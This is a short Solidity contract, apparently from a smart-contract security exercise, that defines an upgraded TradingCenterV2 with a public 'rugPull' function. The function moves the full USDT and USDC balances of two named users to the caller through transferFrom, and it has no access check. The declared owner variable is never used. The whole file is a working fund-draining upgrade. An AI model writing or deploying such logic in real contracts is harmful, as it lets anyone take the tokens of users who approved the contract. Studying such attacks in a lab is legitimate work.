// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    address public owner = msg.sender;

    function rugPull(address _user1, address _user2) public {
        usdt.transferFrom(_user1, msg.sender, usdt.balanceOf(address(_user1)));
        usdc.transferFrom(_user1, msg.sender, usdc.balanceOf(address(_user1)));

        usdt.transferFrom(_user2, msg.sender, usdt.balanceOf(address(_user2)));
        usdc.transferFrom(_user2, msg.sender, usdc.balanceOf(address(_user2)));
    }
}
